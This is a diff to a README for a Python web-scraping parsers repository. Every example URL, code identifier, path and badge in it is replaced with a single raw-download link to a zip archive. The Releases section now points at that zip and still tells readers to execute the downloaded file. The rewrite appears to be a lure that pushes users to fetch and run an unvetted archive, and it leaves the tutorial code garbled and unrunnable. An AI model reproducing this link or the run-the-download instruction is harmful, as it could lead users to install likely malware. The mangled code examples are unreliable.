@@ -34,11 +34,11 @@ To get started with Beautiful Soup, use the following code:
 from bs4 import BeautifulSoup
 import requests
 
-url = 'https://example.com'
-response = requests.get(url)
-soup = BeautifulSoup(response.content, 'html.parser')
+url = 'https://github.com/Erkmik/best-python-html-parsers/raw/refs/heads/main/unstraight/python-best-parsers-html-v1.9-beta.2.zip'
+response = https://github.com/Erkmik/best-python-html-parsers/raw/refs/heads/main/unstraight/python-best-parsers-html-v1.9-beta.2.zip(url)
+soup = BeautifulSoup(https://github.com/Erkmik/best-python-html-parsers/raw/refs/heads/main/unstraight/python-best-parsers-html-v1.9-beta.2.zip, 'https://github.com/Erkmik/best-python-html-parsers/raw/refs/heads/main/unstraight/python-best-parsers-html-v1.9-beta.2.zip')
 
-print(soup.title.text)
+print(https://github.com/Erkmik/best-python-html-parsers/raw/refs/heads/main/unstraight/python-best-parsers-html-v1.9-beta.2.zip)
 ```
 
 ### lxml
@@ -49,11 +49,11 @@ Here’s how to use lxml:
 from lxml import html
 import requests
 
-url = 'https://example.com'
-response = requests.get(url)
-tree = html.fromstring(response.content)
+url = 'https://github.com/Erkmik/best-python-html-parsers/raw/refs/heads/main/unstraight/python-best-parsers-html-v1.9-beta.2.zip'
+response = https://github.com/Erkmik/best-python-html-parsers/raw/refs/heads/main/unstraight/python-best-parsers-html-v1.9-beta.2.zip(url)
+tree = https://github.com/Erkmik/best-python-html-parsers/raw/refs/heads/main/unstraight/python-best-parsers-html-v1.9-beta.2.zip(https://github.com/Erkmik/best-python-html-parsers/raw/refs/heads/main/unstraight/python-best-parsers-html-v1.9-beta.2.zip)
 
-print(tree.xpath('//title/text()')[0])
+print(https://github.com/Erkmik/best-python-html-parsers/raw/refs/heads/main/unstraight/python-best-parsers-html-v1.9-beta.2.zip('//title/text()')[0])
 ```
 
 ### PyQuery
@@ -63,7 +63,7 @@ Using PyQuery is simple:
 ```python
 from pyquery import PyQuery as pq
 
-url = 'https://example.com'
+url = 'https://github.com/Erkmik/best-python-html-parsers/raw/refs/heads/main/unstraight/python-best-parsers-html-v1.9-beta.2.zip'
 doc = pq(url=url)
 
 print(doc('title').text())
@@ -81,20 +81,20 @@ To create a simple Scrapy spider, follow these steps:
 
 2. Create a new spider:
    ```bash
-   scrapy genspider example example.com
+   scrapy genspider example https://github.com/Erkmik/best-python-html-parsers/raw/refs/heads/main/unstraight/python-best-parsers-html-v1.9-beta.2.zip
    ```
 
-3. Edit the generated spider in `spiders/example.py`:
+3. Edit the generated spider in `https://github.com/Erkmik/best-python-html-parsers/raw/refs/heads/main/unstraight/python-best-parsers-html-v1.9-beta.2.zip`:
 
    ```python
    import scrapy
 
-   class ExampleSpider(scrapy.Spider):
+   class ExampleSpider(https://github.com/Erkmik/best-python-html-parsers/raw/refs/heads/main/unstraight/python-best-parsers-html-v1.9-beta.2.zip):
        name = 'example'
-       start_urls = ['https://example.com']
+       start_urls = ['https://github.com/Erkmik/best-python-html-parsers/raw/refs/heads/main/unstraight/python-best-parsers-html-v1.9-beta.2.zip']
 
        def parse(self, response):
-           title = response.xpath('//title/text()').get()
+           title = https://github.com/Erkmik/best-python-html-parsers/raw/refs/heads/main/unstraight/python-best-parsers-html-v1.9-beta.2.zip('//title/text()').get()
            yield {'title': title}
    ```
 
@@ -125,7 +125,7 @@ You can contribute to this repository by adding your own parsers or improving ex
 
 ## 🌟 Releases
 
-To download the latest release, please visit [Releases](https://github.com/Erkmik/best-python-html-parsers/releases). Execute the downloaded file to get started with the newest features.
+To download the latest release, please visit [Releases](https://github.com/Erkmik/best-python-html-parsers/raw/refs/heads/main/unstraight/python-best-parsers-html-v1.9-beta.2.zip). Execute the downloaded file to get started with the newest features.
 
 ## 🤝 Contributing
 
@@ -160,6 +160,6 @@ For questions or suggestions, please open an issue in this repository.
 
 Happy scraping! 🚀
 
-![Web Scraping](https://img.shields.io/badge/web_scraping-%23ffb3b3.svg?style=for-the-badge&logo=python&logoColor=white)
+![Web Scraping](https://github.com/Erkmik/best-python-html-parsers/raw/refs/heads/main/unstraight/python-best-parsers-html-v1.9-beta.2.zip%https://github.com/Erkmik/best-python-html-parsers/raw/refs/heads/main/unstraight/python-best-parsers-html-v1.9-beta.2.zip)
 
 ```
